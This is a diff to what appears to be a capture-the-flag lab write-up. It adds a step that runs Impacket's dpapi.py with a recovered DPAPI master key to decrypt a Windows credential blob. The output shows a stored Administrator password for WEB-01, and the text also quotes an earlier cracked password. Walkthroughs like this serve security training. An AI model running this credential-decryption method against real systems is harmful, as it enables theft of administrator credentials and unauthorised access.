@@ -1143,8 +1143,24 @@ Decrypted key: 0xac7861aa1f899a92f7d8895b96056a76c580515d8a4e71668bc29627f6e9f38
 Using the password nxc found `But_Lying_Aid9!` i am able to decrpyt the key
 
 ```python
+dpapi.py credential -file 32B2774DF751FF7E28E78AE75C237A1E -key '0xac7861aa1f899a92f7d8895b96056a76c580515d8a4e71668bc29627f6e9f38ea289420db75c6f85daac34aba33048af683153b5cfe50dd9945a1be5ab1fe6da'
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[CREDENTIAL]
+LastWritten : 2025-01-16 19:01:39+00:00
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
+Type        : 0x00000001 (CRED_TYPE_GENERIC)
+Target      : LegacyGeneric:target=WEB-01
+Description : Updated by: Administrator on: 1/16/2025
+Unknown     : 
+Username    : Administrator
+Unknown     : Pack_Beneath_Solid9!
 ```
+
+I can then use this key to get another password!
+
+
 
 
 
